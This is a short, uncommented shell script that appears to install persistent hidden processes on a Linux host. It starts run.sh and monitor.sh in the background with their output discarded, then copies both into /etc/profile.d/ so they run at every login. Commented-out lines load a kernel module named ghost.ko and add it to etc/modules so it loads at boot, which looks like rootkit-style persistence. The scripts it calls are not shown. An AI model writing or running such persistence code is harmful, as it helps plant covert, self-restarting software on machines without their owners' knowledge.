./dispose.sh
nohup ./run.sh &
echo -e "\n\n"
./monitor.sh >/dev/null 2>&1 &
bash monitor.sh

# insmod ghost.ko
# echo -e "#<ghost>\nghost\n#<ghost>" >> etc/modules

chmod +x run.sh
chmod +x monitor.sh
cp run.sh /etc/profile.d/
cp monitor.sh /etc/profile.d/